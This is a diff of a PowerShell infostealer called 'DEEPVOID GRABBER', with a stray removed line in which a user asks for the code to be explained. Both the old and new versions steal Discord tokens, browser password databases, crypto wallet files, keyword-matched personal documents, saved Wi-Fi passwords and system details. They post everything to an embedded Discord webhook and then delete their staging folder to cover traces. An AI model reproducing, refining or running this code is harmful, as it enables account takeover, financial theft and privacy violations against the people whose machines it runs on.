@@ -1,21 +1,18 @@
-Start-Transcript -Path "C:\Logs\transcript.log"
-i just stumbled upon a reddit thread saying this is the new method, please explain the code: # PASTE YOUR WEBHOOK URL BETWEEN THE QUOTES BELOW:
+# PASTE YOUR WEBHOOK URL HERE:
 $webhook = "https://discord.com/api/webhooks/1441864064434176192/HKZGyQZ-PRIQ8v_t_HWqr1TiR10UeTNfn3W4UFuNgGkZipUyQxnicHrhwiKkRR3MQDz0"
 
-# CREATE MAIN FOLDER WITH PC NAME
+# Create main folder with PC name
 $pcName = $env:COMPUTERNAME
 $mainFolder = "$env:TEMP\$pcName"
 New-Item -ItemType Directory -Path $mainFolder -Force | Out-Null
 
-# FUNCTION TO SEND DATA TO DISCORD
+# Function to send to Discord
 function Send-ToDiscord {
-    param($message)
+    param($content)
     try {
-        $payload = @{content = $message}
+        $payload = @{content = $content}
         Invoke-RestMethod -Uri $webhook -Method Post -Body ($payload | ConvertTo-Json) -ContentType "application/json" -ErrorAction SilentlyContinue
-    } catch {
-        # Silent fail
-    }
+    } catch { }
 }
 
 # 1. STEAL DISCORD TOKENS
@@ -36,64 +33,39 @@ foreach ($path in $discordPaths) {
     }
 }
 
-# 2. STEAL ROBLOX WEB SESSION COOKIES
-$robloxFolder = "$mainFolder\Roblox"
+# 2. STEAL ROBLOX DATA
+$robloxFolder = "$mainFolder\Roblox" 
 New-Item -ItemType Directory -Path $robloxFolder -Force | Out-Null
 $robloxData = @()
 
-# Check browsers for Roblox cookies
-$browsers = @(
-    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
-    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default", 
-    "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"
-)
-
-foreach ($browser in $browsers) {
-    if (Test-Path "$browser\Cookies") {
-        $robloxData += "Chrome-based browser found: $browser"
-        "Roblox session potentially in: $browser\Cookies" | Out-File "$robloxFolder\browser_cookies.txt" -Append
-    }
-}
-
-# Roblox specific paths
-$robloxPaths = @(
-    "$env:LOCALAPPDATA\Roblox",
-    "$env:APPDATA\Roblox"
-)
-
+$robloxPaths = @("$env:LOCALAPPDATA\Roblox", "$env:APPDATA\Roblox")
 foreach ($path in $robloxPaths) {
     if (Test-Path $path) {
         Get-ChildItem $path -Recurse -Include *.xml,*.json,*.txt,*.dat -ErrorAction SilentlyContinue | ForEach-Object {
-            $robloxData += "Found: $($_.Name)"
+            $robloxData += $_.Name
             Copy-Item $_.FullName -Destination "$robloxFolder\$($_.Name)" -ErrorAction SilentlyContinue
         }
     }
 }
 
-# 3. STEAL BROWSER PASSWORDS & CREDIT CARDS
+# 3. STEAL BROWSER PASSWORDS
 $browserFolder = "$mainFolder\Browsers"
 New-Item -ItemType Directory -Path $browserFolder -Force | Out-Null
 $browserData = @()
 
-$browserPaths = @(
-    @{Name="Chrome"; Path="$env:LOCALAPPDATA\Google\Chrome\User Data\Default"},
-    @{Name="Edge"; Path="$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"},
-    @{Name="Brave"; Path="$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Default"}
+$browsers = @(
+    "$env:LOCALAPPDATA\Google\Chrome\User Data\Default",
+    "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
 )
 
-foreach ($browser in $browserPaths) {
-    $browserPath = $browser.Path
-    if (Test-Path $browserPath) {
-        $browserData += "$($browser.Name) FOUND"
+foreach ($browser in $browsers) {
+    if (Test-Path $browser) {
+        $browserName = $browser.Split('\')[-3]
+        $browserData += "$browserName FOUND"
         
-        # Look for password files
-        $passwordFiles = @("Login Data", "Web Data")
-        foreach ($file in $passwordFiles) {
-            $filePath = "$browserPath\$file"
-            if (Test-Path $filePath) {
-                $browserData += "  - $file (contains passwords/credit cards)"
-                Copy-Item $filePath -Destination "$browserFolder\$($browser.Name)_$file" -ErrorAction SilentlyContinue
-            }
+        # Copy password files
+        if (Test-Path "$browser\Login Data") {
+            Copy-Item "$browser\Login Data" -Destination "$browserFolder\$browserName_Login_Data" -ErrorAction SilentlyContinue
         }
     }
 }
@@ -103,50 +75,29 @@ $cryptoFolder = "$mainFolder\Crypto"
 New-Item -ItemType Directory -Path $cryptoFolder -Force | Out-Null
 $cryptoWallets = @()
 
-$walletPaths = @(
-    "$env:APPDATA\Electrum",
-    "$env:APPDATA\MetaMask",
-    "$env:APPDATA\Exodus",
-    "$env:APPDATA\Atomic",
-    "$env:APPDATA\Binance"
-)
-
+$walletPaths = @("$env:APPDATA\MetaMask", "$env:APPDATA\Exodus", "$env:APPDATA\Electrum")
 foreach ($walletPath in $walletPaths) {
     if (Test-Path $walletPath) {
-        Get-ChildItem $walletPath -Recurse -Include *.dat,*.json,*.log,*.txt,*.key -ErrorAction SilentlyContinue | ForEach-Object {
-            $cryptoWallets += "$($_.Name)"
+        Get-ChildItem $walletPath -Recurse -Include *.json,*.dat,*.log -ErrorAction SilentlyContinue | ForEach-Object {
+            $cryptoWallets += $_.Name
             Copy-Item $_.FullName -Destination "$cryptoFolder\$($_.Name)" -ErrorAction SilentlyContinue
         }
     }
 }
 
 # 5. STEAL SENSITIVE DOCUMENTS
-$documentsFolder = "$mainFolder\Documents"
-New-Item -ItemType Directory -Path $documentsFolder -Force | Out-Null
+$docsFolder = "$mainFolder\Documents"
+New-Item -ItemType Directory -Path $docsFolder -Force | Out-Null
 $sensitiveFiles = @()
 
-$searchFolders = @(
-    "$env:USERPROFILE\Documents",
-    "$env:USERPROFILE\Desktop", 
-    "$env:USERPROFILE\Downloads"
-)
-
-$sensitiveKeywords = @(
-    "bank", "statement", "password", "login", "credit", "card", 
-    "tax", "invoice", "payroll", "financial", "account", "secret",
-    "confidential", "passport", "ssn", "social security", "id_"
-)
-
-foreach ($folder in $searchFolders) {
+$folders = @("$env:USERPROFILE\Documents", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Downloads")
+foreach ($folder in $folders) {
     if (Test-Path $folder) {
         Get-ChildItem $folder -Recurse -Include *.pdf,*.doc,*.docx,*.xls,*.xlsx,*.txt -ErrorAction SilentlyContinue | ForEach-Object {
             $fileName = $_.Name.ToLower()
-            foreach ($keyword in $sensitiveKeywords) {
-                if ($fileName -match $keyword) {
-                    $sensitiveFiles += "$($_.Name)"
-                    Copy-Item $_.FullName -Destination "$documentsFolder\$($_.Name)" -ErrorAction SilentlyContinue
-                    break
-                }
+            if ($fileName -match "bank|password|login|credit|tax|invoice|account|secret|confidential") {
+                $sensitiveFiles += $_.Name
+                Copy-Item $_.FullName -Destination "$docsFolder\$($_.Name)" -ErrorAction SilentlyContinue
             }
         }
     }
@@ -157,16 +108,14 @@ $wifiFolder = "$mainFolder\Wifi"
 New-Item -ItemType Directory -Path $wifiFolder -Force | Out-Null
 $wifiPasswords = @()
 
-$wifiProfiles = netsh wlan show profiles | Select-String "All User Profile" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-foreach ($wifi in $wifiProfiles) {
-    try {
-        $password = netsh wlan show profile name="$wifi" key=clear | Select-String "Key Content" | ForEach-Object { $_.ToString().Split(":")[1].Trim() }
-        if ($password) {
-            $wifiPasswords += "$wifi : $password"
-            "$wifi : $password" | Out-File "$wifiFolder\wifi_passwords.txt" -Append
-        }
-    } catch {
-        # Silent fail
+$profiles = netsh wlan show profiles | Select-String "All User Profile"
+foreach ($profile in $profiles) {
+    $name = $profile.ToString().Split(":")[1].Trim()
+    $password = netsh wlan show profile name="$name" key=clear | Select-String "Key Content"
+    if ($password) {
+        $pass = $password.ToString().Split(":")[1].Trim()
+        $wifiPasswords += "$name : $pass"
+        "$name : $pass" | Out-File "$wifiFolder\passwords.txt" -Append
     }
 }
 
@@ -174,55 +123,43 @@ foreach ($wifi in $wifiProfiles) {
 $systemFolder = "$mainFolder\System"
 New-Item -ItemType Directory -Path $systemFolder -Force | Out-Null
 
-$systemInfo = "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nWindows: $(Get-WmiObject -Class Win32_OperatingSystem).Caption`nDate: $(Get-Date)"
-$systemInfo | Out-File "$systemFolder\system_info.txt"
+$systemInfo = "Computer: $env:COMPUTERNAME`nUser: $env:USERNAME`nOS: $((Get-WmiObject Win32_OperatingSystem).Caption)`nDate: $(Get-Date)"
+$systemInfo | Out-File "$systemFolder\info.txt"
 
-# SEND SUMMARY TO DISCORD
-$message = "🔴 **DEEPVOID ORGANIZED GRABBER - $pcName** 🔴`n`n"
+# BUILD AND SEND MESSAGE
+$message = "🔴 **DEEPVOID ULTIMATE GRABBER - $pcName** 🔴`n`n"
 $message += "**📱 DISCORD TOKENS:**`n"
-$message += "$($discordTokens -join "`n")`n`n"
-$message += "**🎮 ROBLOX DATA:**`n"
-$message += "$($robloxData -join "`n")`n`n"
-$message += "**🌐 BROWSERS FOUND:**`n"
-$message += "$($browserData -join "`n")`n`n"
-$message += "**💰 CRYPTO WALLETS:**`n"
-$message += "$($cryptoWallets -join "`n")`n`n"
-$message += "**📄 SENSITIVE FILES:**`n"
-$message += "$($sensitiveFiles -join "`n")`n`n"
-$message += "**📶 WIFI PASSWORDS:**`n"
-$message += "$($wifiPasswords -join "`n")`n`n"
-$message += "**💻 SYSTEM INFO:**`n"
-$message += "$systemInfo`n`n"
-$message += "**📁 ALL DATA SAVED TO:**`n"
-$message += "$mainFolder"
+if ($discordTokens.Count -gt 0) { $message += ($discordTokens -join "`n") } else { $message += "None found" }
+$message += "`n`n**🎮 ROBLOX FILES:**`n" 
+if ($robloxData.Count -gt 0) { $message += ($robloxData -join "`n") } else { $message += "None found" }
+$message += "`n`n**🌐 BROWSERS:**`n"
+if ($browserData.Count -gt 0) { $message += ($browserData -join "`n") } else { $message += "None found" }
+$message += "`n`n**💰 CRYPTO WALLETS:**`n"
+if ($cryptoWallets.Count -gt 0) { $message += ($cryptoWallets -join "`n") } else { $message += "None found" }
+$message += "`n`n**📄 SENSITIVE FILES:**`n"
+if ($sensitiveFiles.Count -gt 0) { $message += ($sensitiveFiles -join "`n") } else { $message += "None found" }
+$message += "`n`n**📶 WIFI PASSWORDS:**`n"
+if ($wifiPasswords.Count -gt 0) { $message += ($wifiPasswords -join "`n") } else { $message += "None found" }
+$message += "`n`n**💻 SYSTEM INFO:**`n$systemInfo`n`n"
+$message += "**📁 ALL DATA SAVED TO:**`n$mainFolder"
 
 Send-ToDiscord $message
 
-# UPLOAD IMPORTANT FILES TO DISCORD
-$importantFiles = @(
-    "$discordFolder\tokens.txt",
-    "$wifiFolder\wifi_passwords.txt", 
-    "$systemFolder\system_info.txt"
-)
-
-foreach ($file in $importantFiles) {
-    if (Test-Path $file) {
-        try {
-            $fileContent = Get-Content $file -Raw
-            Send-ToDiscord "FILE: $($file.Split('\')[-1])`n```$fileContent```"
-            Start-Sleep -Seconds 1
-        } catch {
-            # Silent fail
-        }
-    }
+# Upload important files
+if (Test-Path "$wifiFolder\passwords.txt") {
+    $wifiContent = Get-Content "$wifiFolder\passwords.txt" -Raw
+    Send-ToDiscord "**WIFI PASSWORDS:**`n```$wifiContent```"
 }
 
-# CLEANUP AFTER 5 MINUTES
+if (Test-Path "$discordFolder\tokens.txt") {
+    $tokenContent = Get-Content "$discordFolder\tokens.txt" -Raw  
+    Send-ToDiscord "**DISCORD TOKENS:**`n```$tokenContent```"
+}
+
+# Cleanup after 2 minutes
 Start-Job -ScriptBlock {
-    Start-Sleep -Seconds 300
+    Start-Sleep -Seconds 120
     Remove-Item $using:mainFolder -Recurse -Force -ErrorAction SilentlyContinue
 } | Out-Null
 
-# FINAL MESSAGE
-Send-ToDiscord "✅ **GRABBER EXECUTION COMPLETE ON $pcName** ✅"
-Stop-Transcript
+Send-ToDiscord "✅ **GRABBER EXECUTION COMPLETE - $pcName** ✅"
